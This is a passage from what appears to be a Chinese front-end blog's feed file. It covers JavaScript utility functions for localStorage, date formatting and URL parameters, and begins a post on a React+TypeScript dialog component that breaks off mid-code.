function">getLocalStorageItem</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//localStorage存值</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">setLocalStorageItem</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> value <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//localStorage删除值</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">removeLocalStorageItem</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> localStorage<span class="token punctuation">.</span><span class="token function">removeItem</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gjug7sua6bj30ga08udgy.jpg" alt="image-20201019104657127">  </p><h2 id="时间格式化"><a href="#时间格式化" class="headerlink" title="时间格式化"></a>时间格式化</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">getFillDate</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>key <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`0</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>key<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>key<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** * 时间戳转化为年月日 * @param times 时间戳 * @param ymd 格式类型(yyyy-mm-dd,yyyy/mm/dd) * @param hms 可选,格式类型(hh,hh:mm,hh:mm:ss) * @returns {年月日} */</span><span class="token keyword">export</span> <span class="token keyword">function</span> dateFomat <span class="token punctuation">(</span>times<span class="token punctuation">,</span> ymd<span class="token punctuation">,</span>  hms<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> oDate <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>times<span class="token punctuation">)</span>  <span class="token keyword">const</span> oYear <span class="token operator">=</span> oDate<span class="token punctuation">.</span><span class="token function">getFullYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> oMonth <span class="token operator">=</span> oDate<span class="token punctuation">.</span><span class="token function">getMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>  <span class="token keyword">const</span> oDay <span class="token operator">=</span> oDate<span class="token punctuation">.</span><span class="token function">getDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> oHour <span class="token operator">=</span> oDate<span class="token punctuation">.</span><span class="token function">getHours</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> oMin <span class="token operator">=</span> oDate<span class="token punctuation">.</span><span class="token function">getMinutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> oSec <span class="token operator">=</span> oDate<span class="token punctuation">.</span><span class="token function">getSeconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> oTime <span class="token comment" spellcheck="true">// 最后拼接时间</span>  <span class="token comment" spellcheck="true">// 年月日格式</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>ymd<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token string">'yyyy-mm-dd'</span><span class="token punctuation">:</span>      oTime <span class="token operator">=</span> oYear <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> <span class="token function">getFillDate</span><span class="token punctuation">(</span>oMonth<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> <span class="token function">getFillDate</span><span class="token punctuation">(</span>oDay<span class="token punctuation">)</span>      <span class="token keyword">break</span>    <span class="token keyword">case</span> <span class="token string">'yyyy/mm/dd'</span><span class="token punctuation">:</span>      oTime <span class="token operator">=</span> oYear <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token function">getFillDate</span><span class="token punctuation">(</span>oMonth<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token function">getFillDate</span><span class="token punctuation">(</span>oDay<span class="token punctuation">)</span>      <span class="token keyword">break</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 时分秒格式</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>hms<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token string">'hh'</span><span class="token punctuation">:</span>      oTime <span class="token operator">=</span> oTime <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token function">getFillDate</span><span class="token punctuation">(</span>oHour<span class="token punctuation">)</span>      <span class="token keyword">break</span>    <span class="token keyword">case</span> <span class="token string">'hh:mm'</span><span class="token punctuation">:</span>      oTime <span class="token operator">=</span> oTime <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token function">getFillDate</span><span class="token punctuation">(</span>oHour<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> <span class="token function">getFillDate</span><span class="token punctuation">(</span>oMin<span class="token punctuation">)</span>      <span class="token keyword">break</span>    <span class="token keyword">case</span> <span class="token string">'hh:mm:ss'</span><span class="token punctuation">:</span>      oTime <span class="token operator">=</span> oTime <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token function">getFillDate</span><span class="token punctuation">(</span>oHour<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> <span class="token function">getFillDate</span><span class="token punctuation">(</span>oMin<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> <span class="token function">getFillDate</span><span class="token punctuation">(</span>oSec<span class="token punctuation">)</span>      <span class="token keyword">break</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> oTime<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gjuh626k0pj30ap059q3f.jpg" alt="image-20201019111954118">  </p><h2 id="JSON转URL参数"><a href="#JSON转URL参数" class="headerlink" title="JSON转URL参数"></a>JSON转URL参数</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">paramsToUrlQuery</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> types <span class="token operator">=</span> Object<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>types <span class="token operator">===</span> <span class="token string">'Object'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> tempArr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> params<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">let</span> key <span class="token operator">=</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> value <span class="token operator">=</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>params<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            tempArr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token string">'='</span> <span class="token operator">+</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">let</span> urlParamsStr <span class="token operator">=</span> tempArr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> urlParamsStr<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token string">'model is not object'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gjwrwawp4ij308403ajrl.jpg" alt="image-20201021110205911">  </p><h2 id="删除url指定参数"><a href="#删除url指定参数" class="headerlink" title="删除url指定参数"></a>删除url指定参数</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">delUrlParam</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> baseUrl <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'?'</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> query <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> arr <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            obj<span class="token punctuation">[</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">delete</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> url <span class="token operator">=</span>            baseUrl <span class="token operator">+</span>            JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[\"\{\}]/g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\:/g</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\,/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> url<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> url<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gjx048ff69j30g801hmxa.jpg" alt="image-20201021154629569">  </p><h2 id="获取url全部参数转json"><a href="#获取url全部参数转json" class="headerlink" title="获取url全部参数转json"></a>获取url全部参数转json</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> getAllUrlParamsToJson <span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> urlRes <span class="token operator">=</span> url <span class="token operator">?</span> url <span class="token punctuation">:</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">;</span>  <span class="token keyword">let</span> _pa <span class="token operator">=</span> urlRes<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>urlRes<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      _arrS <span class="token operator">=</span> _pa<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      _rs <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> _len <span class="token operator">=</span> _arrS<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> _len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">let</span> pos <span class="token operator">=</span> _arrS<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">let</span> name <span class="token operator">=</span> _arrS<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pos<span class="token punctuation">)</span><span class="token punctuation">,</span>          value <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>_arrS<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>pos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      _rs<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> _rs<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/blob/image-20201021160959984.png" alt="image-20201021160959984"></p><h2 id="去除字符串空格"><a href="#去除字符串空格" class="headerlink" title="去除字符串空格"></a>去除字符串空格</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">/** * @description 去除空格 * @param { string } str 待处理字符串 * @param  { number } type 去除空格类型 1-所有空格  2-前后空格  3-前空格 4-后空格 默认为1 */</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">trim</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> type <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">&amp;&amp;</span> type <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> type <span class="token operator">!==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> type <span class="token operator">!==</span> <span class="token number">3</span> <span class="token operator">&amp;&amp;</span> type <span class="token operator">!==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\s/g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(^\s)|(\s*$)/g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(^\s)/g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(\s$)/g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> str<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gjwx65unkej309e066wep.jpg" alt="image-20201021140442396">  </p>]]></content>
      
      
      <categories>
          
          <category> 工具类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> URL </tag>
            
            <tag> JSON </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React+TS弹窗</title>
      <link href="2020/09/29/React+TS%E5%BC%B9%E7%AA%97/"/>
      <url>2020/09/29/React+TS%E5%BC%B9%E7%AA%97/</url>
      
        <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在日常的需求开发中我们经常需要用到弹窗，那么在我们构建弹窗时，在引用组件是都需要引入组件DOM，然后通过事件来控制组件的影藏显示，调用也不是很方便；</p><p>本组件使用事前注册DOM的方式，业务方在使用时刻直接调用暴露的方法即可，无需再引用DOM。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj7klswuu3j30ak0mtmyg.jpg" alt="image-20200929155048437">  </p><h2 id="组件使用示例"><a href="#组件使用示例" class="headerlink" title="组件使用示例"></a>组件使用示例</h2><blockquote><p>import newDialog from “*./components/newDialog”</p></blockquote><pre class="line-numbers language-js"><code class="language-js">newDialog<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    title<span class="token punctuation">:</span> <span class="token string">"退出发布"</span><span class="token punctuation">,</span>    content<span class="token punctuation">:</span> <span class="token string">'是否需要保存草稿箱？'</span><span class="token punctuation">,</span>    btn<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span> text<span class="token punctuation">:</span> <span class="token string">"不保存"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span> text<span class="token punctuation">:</span> <span class="token string">"保存"</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    callback<span class="token punctuation">:</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>result <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//TODO</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">//TODO</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><table><thead><tr><th>参数</th><th>说明</th><th>类型</th><th>是否必填</th></tr></thead><tbody><tr><td>title</td><td>弹窗标题</td><td>String</td><td>√</td></tr><tr><td>content</td><td>弹窗展示内容</td><td>String|ReactDom</td><td>√</td></tr><tr><td>btn</td><td>弹窗按钮可配置一个或者两个</td><td>Array</td><td>√</td></tr><tr><td>callback</td><td>弹窗响应回调方法</td><td>Function</td><td>√</td></tr></tbody></table><p>弹窗按钮说明</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//弹窗按钮是json数组配置的 最多配置两个</span>btn<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span> text<span class="token punctuation">:</span> <span class="token string">"不保存"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span> text<span class="token punctuation">:</span> <span class="token string">"保存"</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//每个按钮只需要配置text按钮文案即可 样式和颜色都集成到css</span><span class="token comment" spellcheck="true">//如果配置一个按钮就是底部长按钮 配置两个根据配置的数组顺序从左向右展示</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>回调参数</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//点击按钮会返回回调数据并关闭弹出</span><span class="token punctuation">{</span>  result<span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span> <span class="token comment" spellcheck="true">//返回按钮的索引值</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p>js代码newDialog.tsx</p><pre class="line-numbers language-jsx"><code class="language-jsx"><span class="token string">'use strict'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'./newDialog.scss'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> cs <span class="token keyword">from</span> <span class="token string">"classnames"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> ReactDOM <span class="token keyword">from</span> <span class="token string">'react-dom'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> isIphoneX <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./../../util/util'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/**  * @description 解决移动端滚动穿透事件  **/</span><span class="token keyword">const</span> ModalHelper <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>bodyCls<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> scrollTop<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>        afterOpen<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            scrollTop <span class="token operator">=</span> document<span class="token punctuation">.</span>scrollingElement<span class="token punctuation">.</span>scrollTop<span class="token punctuation">;</span>            document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>bodyCls<span class="token punctuation">)</span><span class="token punctuation">;</span>            document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>style<span class="token punctuation">.</span>top <span class="token operator">=</span> <span class="token operator">-</span>scrollTop <span class="token operator">+</span> <span class="token string">'px'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        beforeClose<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>bodyCls<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// scrollTop lost after set position:fixed, restore it back.</span>            document<span class="token punctuation">.</span>scrollingElement<span class="token punctuation">.</span>scrollTop <span class="token operator">=</span> scrollTop<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'modal-open'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">IAppProps</span> <span class="token punctuation">{</span>    title<span class="token operator">?</span><span class="token punctuation">:</span> string<span class="token punctuation">;</span>    content<span class="token operator">?</span><span class="token punctuation">:</span> any<span class="token punctuation">;</span>    btn<span class="token operator">?</span><span class="token punctuation">:</span> any<span class="token punctuation">;</span>    callback<span class="token operator">?</span><span class="token punctuation">:</span> Function<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">IAppState</span> <span class="token punctuation">{</span>    showToast<span class="token operator">?</span><span class="token punctuation">:</span> Boolean<span class="token punctuation">;</span>    title<span class="token operator">?</span><span class="token punctuation">:</span> string<span class="token punctuation">;</span>    content<span class="token operator">?</span><span class="token punctuation">:</span> any<span class="token punctuation">;</span>    btn<span class="token operator">?</span><span class="token punctuation">:</span> any<span class="token punctuation">;</span>    callback<span class="token operator">?</span><span class="token punctuation">:</span> Function<span class="token punctuation">;</span>    isIPhoneX<span class="token operator">?</span><span class="token punctuation">:</span> Boolean<span class="token punctuation">;</span><span class="token 